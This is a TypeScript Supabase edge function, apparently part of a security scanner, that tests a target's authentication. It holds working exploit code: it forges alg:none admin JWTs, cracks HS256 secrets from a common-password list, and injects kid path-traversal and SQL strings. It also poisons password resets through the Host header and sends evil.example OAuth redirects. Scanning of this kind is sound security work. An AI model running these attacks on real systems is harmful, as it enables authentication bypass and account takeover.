// auth-deep — JWT abuse + Host-header password reset poisoning + OAuth misconfig
//
// Tests:
//  1. JWT alg:none — re-sign payload with `alg: none`, claim admin
//  2. JWT kid traversal / SQLi — try kid: "../../etc/passwd", kid: "x' UNION..."
//  3. JWT weak HS256 — try common secrets (jwt, secret, password, key, 123456)
//  4. JWT JWK injection — embed our own jwk in header
//  5. Host header poisoning of password reset — send X-Forwarded-Host: evil.com
//  6. OAuth redirect_uri open redirect — test ?redirect_uri=https://evil.com
//
// All findings → confirmFinding gate.

import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";
import { safeFetch, readBodySafe, headersToObject } from "../_shared/safe-fetch.ts";
import { confirmFinding } from "../_shared/ai-confirm-gate.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};
const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

const COMMON_HS256_SECRETS = [
  "secret", "password", "jwt", "key", "1234", "12345", "123456",
  "supersecret", "your-256-bit-secret", "default", "changeme", "admin",
];

interface AuthInput {
  targetId: string;
  jwt?: string;                 // existing JWT to attack
  protectedUrl?: string;        // URL that requires the JWT
  passwordResetUrl?: string;    // POST endpoint for password reset
  resetEmailField?: string;     // body field name (default "email")
  resetEmail?: string;
  oauthAuthorizeUrl?: string;   // e.g. /oauth/authorize?client_id=...
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  const supa = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
  let input: AuthInput;
  try { input = await req.json(); } catch { return j({ ok: false, error: "invalid json" }); }

  const findings: any[] = [];

  // ── JWT attacks
  if (input.jwt && input.protectedUrl) {
    const baseline = await jget(input.protectedUrl, input.jwt);
    if (baseline) {
      // 1. alg:none
      const noneJwt = forgeAlgNone(input.jwt);
      if (noneJwt) {
        const r = await jget(input.protectedUrl, noneJwt);
        if (r && r.status >= 200 && r.status < 300 && similarity(r.body, baseline.body) > 0.5) {
          await pushAuth(supa, input.targetId, findings, {
            kind: "jwt-alg-none", severity: "critical",
            title: "JWT alg:none accepted — full auth bypass",
            payload: noneJwt, baseline, mutated: r, proofType: "jwt_alg_none_accepted",
          });
        }
      }

      // 2. weak HS256 secret crack
      const cracked = await tryCrackHs256(input.jwt);
      if (cracked) {
        await pushAuth(supa, input.targetId, findings, {
          kind: "jwt-weak-secret", severity: "critical",
          title: `JWT signed with weak HS256 secret: "${cracked}"`,
          payload: `secret=${cracked}`, baseline, mutated: { status: 0, body: "(offline crack)", headers: {} },
          proofType: "jwt_weak_secret_cracked",
        });
      }

      // 3. kid traversal / SQLi
      for (const kid of ["../../../../../../dev/null", "x' UNION SELECT 'x'-- "]) {
        const evil = forgeKid(input.jwt, kid);
        if (!evil) continue;
        const r = await jget(input.protectedUrl, evil);
        if (r && r.status >= 200 && r.status < 300 && similarity(r.body, baseline.body) > 0.5) {
          await pushAuth(supa, input.targetId, findings, {
            kind: "jwt-kid-injection", severity: "high",
            title: `JWT kid header injection accepted (${kid})`,
            payload: evil, baseline, mutated: r, proofType: "jwt_kid_accepted",
          });
        }
      }
    }
  }

  // ── Host-header password reset poisoning
  if (input.passwordResetUrl && input.resetEmail) {
    const evilHost = `cyberscope-poison.example`;
    const field = input.resetEmailField || "email";
    try {
      const r = await safeFetch(input.passwordResetUrl, {
        method: "POST",
        headers: {
          "Host": evilHost,
          "X-Forwarded-Host": evilHost,
          "X-Forwarded-Server": evilHost,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ [field]: input.resetEmail }),
      }, 8000);
      const body = await readBodySafe(r, 6000);
      // Deterministic proof: response echoes the evil host into a reset URL or token link
      if (body.includes(evilHost) || /reset_url|reset_link|reset_token.*evil/i.test(body)) {
        const verdict = await confirmFinding({
          vulnClass: "host-header-poisoning",
          payload: `X-Forwarded-Host: ${evilHost}`,
          endpoint: input.passwordResetUrl,
          mutated: { status: r.status, bodySnippet: body.slice(0, 1500), length: body.length, headers: headersToObject(r.headers) },
          deterministicProof: true, proofType: "evil_host_in_reset_response",
        });
        if (verdict.recommendedAction !== "drop_false_positive" && verdict.recommendedAction !== "drop_honeypot") {
          findings.push(await persist(supa, input.targetId, {
            kind: "host-header-poisoning", severity: "high",
            title: "Password reset URL poisoning via Host header",
            url: input.passwordResetUrl, payload: `X-Forwarded-Host: ${evilHost}`,
            body, status: r.status, verdict,
          }));
        }
      }
    } catch (_) {}
  }

  // ── OAuth redirect_uri open redirect
  if (input.oauthAuthorizeUrl) {
    const evil = "https://evil.example/cyberscope";
    const u = new URL(input.oauthAuthorizeUrl);
    u.searchParams.set("redirect_uri", evil);
    try {
      const r = await safeFetch(u.toString(), {}, 6000);
      const loc = r.headers.get("location") || "";
      if (r.status >= 300 && r.status < 400 && loc.startsWith("https://evil.example")) {
        const verdict = await confirmFinding({
          vulnClass: "oauth-open-redirect",
          payload: evil, endpoint: u.toString(),
          mutated: { status: r.status, bodySnippet: `Location: ${loc}`, length: loc.length, headers: headersToObject(r.headers) },
          deterministicProof: true, proofType: "redirect_uri_unvalidated",
        });
        if (verdict.recommendedAction !== "drop_false_positive" && verdict.recommendedAction !== "drop_honeypot") {
          findings.push(await persist(supa, input.targetId, {
            kind: "oauth-open-redirect", severity: "high",
            title: "OAuth redirect_uri unvalidated — token theft possible",
            url: u.toString(), payload: evil, body: `Location: ${loc}`, status: r.status, verdict,
          }));
        }
      }
    } catch (_) {}
  }

  return j({ ok: true, findings_count: findings.length, findings });
});

// ── JWT helpers
function b64uEnc(s: string) { return btoa(s).replaceAll("+","-").replaceAll("/","_").replaceAll("=",""); }
function b64uDec(s: string) { s += "===".slice((s.length + 3) % 4); return atob(s.replaceAll("-","+").replaceAll("_","/")); }
function splitJwt(jwt: string): { h: any; p: any; sig: string } | null {
  const parts = jwt.split("."); if (parts.length !== 3) return null;
  try { return { h: JSON.parse(b64uDec(parts[0])), p: JSON.parse(b64uDec(parts[1])), sig: parts[2] }; } catch { return null; }
}
function forgeAlgNone(jwt: string): string | null {
  const s = splitJwt(jwt); if (!s) return null;
  const h = { ...s.h, alg: "none" }; const p = { ...s.p, role: "admin", is_admin: true };
  return `${b64uEnc(JSON.stringify(h))}.${b64uEnc(JSON.stringify(p))}.`;
}
function forgeKid(jwt: string, kid: string): string | null {
  const s = splitJwt(jwt); if (!s) return null;
  const h = { ...s.h, kid }; return `${b64uEnc(JSON.stringify(h))}.${b64uEnc(JSON.stringify(s.p))}.${s.sig}`;
}
async function tryCrackHs256(jwt: string): Promise<string | null> {
  const parts = jwt.split("."); if (parts.length !== 3) return null;
  const signed = parts[0] + "." + parts[1];
  const expected = parts[2];
  const enc = new TextEncoder();
  for (const sec of COMMON_HS256_SECRETS) {
    try {
      const key = await crypto.subtle.importKey("raw", enc.encode(sec), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
      const sig = await crypto.subtle.sign("HMAC", key, enc.encode(signed));
      const got = b64uEnc(String.fromCharCode(...new Uint8Array(sig)));
      if (got === expected) return sec;
    } catch (_) {}
  }
  return null;
}

async function jget(url: string, jwt: string): Promise<{ status: number; body: string; headers: Record<string,string> } | null> {
  try {
    const r = await safeFetch(url, { headers: { Authorization: jwt.startsWith("Bearer") ? jwt : `Bearer ${jwt}` } }, 6000);
    return { status: r.status, body: await readBodySafe(r, 6000), headers: headersToObject(r.headers) };
  } catch { return null; }
}
function similarity(a: string, b: string) {
  if (!a || !b) return 0;
  const k = (s: string) => { const o = new Set<string>(); for (let i = 0; i < s.length - 8; i += 4) o.add(s.slice(i, i+8)); return o; };
  const A = k(a), B = k(b); let n = 0; A.forEach(x => B.has(x) && n++);
  return n / Math.max(1, A.size + B.size - n);
}
async function pushAuth(supa: any, targetId: string, findings: any[], f: any) {
  const verdict = await confirmFinding({
    vulnClass: f.kind, payload: f.payload, endpoint: f.baseline?.url || "(jwt)",
    baseline: f.baseline ? { status: f.baseline.status, bodySnippet: f.baseline.body.slice(0,600), length: f.baseline.body.length } : undefined,
    mutated:  f.mutated  ? { status: f.mutated.status,  bodySnippet: (f.mutated.body || "").slice(0,600), length: (f.mutated.body || "").length } : undefined,
    deterministicProof: true, proofType: f.proofType,
  });
  if (verdict.recommendedAction === "drop_false_positive" || verdict.recommendedAction === "drop_honeypot") return;
  findings.push(await persist(supa, targetId, { ...f, verdict, body: f.mutated?.body || "", status: f.mutated?.status || 0, url: f.baseline?.url || "(jwt)" }));
}
async function persist(supa: any, targetId: string, f: any) {
  const isApproval = f.verdict.recommendedAction === "insert_approval";
  const table = isApproval ? "pending_approvals" : "vulnerability_findings";
  const row = isApproval
    ? { target_id: targetId, finding_type: f.kind, severity: f.severity, title: f.title,
        description: f.verdict.reasoning, payload_used: f.payload,
        confidence_score: f.verdict.confidence, ai_verified: true, ai_verification_notes: f.verdict.reasoning,
        evidence: { url: f.url, status: f.status, body_snippet: (f.body || "").slice(0,2000), proofType: f.verdict.proofType } }
    : { target_id: targetId, title: f.title, severity: f.severity,
        description: f.verdict.reasoning, payload: f.payload,
        confidence_score: f.verdict.confidence, ai_verified: true,
        triage_reasoning: f.verdict.reasoning, validation_status: "verified" };
  const { data } = await supa.from(table).insert(row).select("id").single();
  return { id: data?.id, kind: f.kind, severity: f.severity, title: f.title };
}
function j(b: unknown, s = 200) { return new Response(JSON.stringify(b), { status: s, headers: { ...corsHeaders, "Content-Type": "application/json" } }); }
